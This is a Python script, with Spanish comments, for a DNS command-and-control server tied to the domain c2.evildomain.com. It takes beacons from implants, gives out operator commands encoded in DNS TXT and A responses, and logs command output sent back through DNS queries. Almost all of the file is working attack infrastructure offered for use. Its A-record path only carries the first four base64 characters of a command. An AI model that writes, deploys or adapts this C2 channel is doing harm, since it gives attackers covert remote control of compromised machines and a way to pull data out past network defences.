#!/usr/bin/env python3
# Servidor DNS C2 – robusto y funcional
# sudo python3 server_dns.py

import socket
import struct
import threading
import base64
import time
import random

C2_DOMAIN = b'c2.evildomain.com'
PORT = 53
pending_cmds = []
cmd_lock = threading.Lock()

def encode_b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def decode_b64(data):
    # Añadir padding si es necesario
    pad = 4 - (len(data) % 4)
    if pad != 4:
        data += '=' * pad
    return base64.urlsafe_b64decode(data)

def decode_dns_name(data, pos):
    """Decodifica un nombre DNS (puede tener compresión)"""
    name_parts = []
    while True:
        if pos >= len(data):
            break
        length = data[pos]
        if length == 0:
            pos += 1
            break
        if length & 0xC0:
            # Compresión: apunta a otro offset
            offset = ((length & 0x3F) << 8) | data[pos+1]
            sub, _ = decode_dns_name(data, offset)
            name_parts.append(sub)
            pos += 2
            break
        pos += 1
        name_parts.append(data[pos:pos+length].decode())
        pos += length
    return '.'.join(name_parts), pos

def build_dns_response(query_data, answer_name, qtype, qclass, rdata_str, ttl=60):
    """Construye respuesta DNS con registro A o TXT"""
    qid = struct.unpack('!H', query_data[:2])[0]
    header = struct.pack('!HHHHHH',
        qid,
        0x8180,         # QR=1, opcode=0, AA=0, TC=0, RD=1, RA=1, Z=0, RCODE=0
        1,              # QDCOUNT
        1,              # ANCOUNT
        0, 0
    )
    # Reutilizar la pregunta original (después de la cabecera)
    question = query_data[12:12+len(query_data)-12]
    # Construir respuesta según tipo
    if qtype == 1:  # A
        rdata = socket.inet_aton(rdata_str)
        rdlength = 4
        ans = struct.pack('!HHHIH', 0xc00c, 1, 1, ttl, rdlength) + rdata
    elif qtype == 16:  # TXT
        if rdata_str:
            txt = rdata_str.encode()
            rdlength = 1 + len(txt)
            ans = struct.pack('!HHHIH', 0xc00c, 16, 1, ttl, rdlength) + struct.pack('!B', len(txt)) + txt
        else:
            ans = struct.pack('!HHHIH', 0xc00c, 16, 1, ttl, 0) + b'\x00'
    else:
        return None
    return header + question + ans

def handle_query(data, addr, sock):
    try:
        if len(data) < 12:
            return
        # Extraer el nombre y tipo
        name, pos = decode_dns_name(data, 12)
        if pos + 4 > len(data):
            return
        qtype = (data[pos] << 8) | data[pos+1]
        qclass = (data[pos+2] << 8) | data[pos+3]

        print(f"[DNS] {name} (type={qtype})")

        # Procesar según el nombre
        if name.startswith('B:'):
            # Beacon
            parts = name.split('.')
            encoded = parts[0][2:]  # quitar 'B:'
            try:
                decoded = decode_b64(encoded)
                print(f"[Beacon] {decoded}")
            except:
                print(f"[Beacon] raw: {encoded}")
            # Responder con un comando pendiente (codificado en TXT)
            global pending_cmds
            with cmd_lock:
                if pending_cmds:
                    cmd = pending_cmds.pop(0)
                    resp = encode_b64(cmd.encode())
                else:
                    resp = ''
            response = build_dns_response(data, name, qtype, qclass, resp)
            if response:
                sock.sendto(response, addr)

        elif name.startswith('cmd_'):
            # Petición de comando (tipo A)
            with cmd_lock:
                if pending_cmds:
                    cmd = pending_cmds.pop(0)
                    cmd_b64 = encode_b64(cmd.encode())
                    # La IP debe tener 4 bytes; usamos los primeros 4 caracteres del base64
                    # Si el base64 es más corto, lo rellenamos con 'A'
                    ip_bytes = cmd_b64.ljust(4, 'A')[:4]
                    # Convertir cada carácter a su valor ASCII para la IP
                    ip_str = '.'.join(str(ord(c)) for c in ip_bytes)
                else:
                    ip_str = '0.0.0.0'
            response = build_dns_response(data, name, qtype, qclass, ip_str)
            if response:
                sock.sendto(response, addr)

        elif name.endswith(C2_DOMAIN.decode()):
            # Respuesta de comando (TXT)
            parts = name.split('.')
            encoded = parts[0]
            try:
                decoded = decode_b64(encoded)
                print(f"[Cmd Output] {decoded}")
            except:
                print(f"[Cmd Output] raw: {encoded}")
            response = build_dns_response(data, name, qtype, qclass, '')
            if response:
                sock.sendto(response, addr)
        else:
            # Ignorar
            pass
    except Exception as e:
        print(f"Error: {e}")

def dns_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', PORT))
    print(f"[*] DNS C2 server listening on port {PORT} (domain: {C2_DOMAIN.decode()})")
    while True:
        data, addr = sock.recvfrom(1024)
        threading.Thread(target=handle_query, args=(data, addr, sock), daemon=True).start()

def cmd_input():
    global pending_cmds
    while True:
        cmd = input("cmd> ").strip()
        if cmd:
            with cmd_lock:
                pending_cmds.append(cmd)
                print(f"[*] Command '{cmd}' queued")

if __name__ == '__main__':
    threading.Thread(target=cmd_input, daemon=True).start()
    dns_server()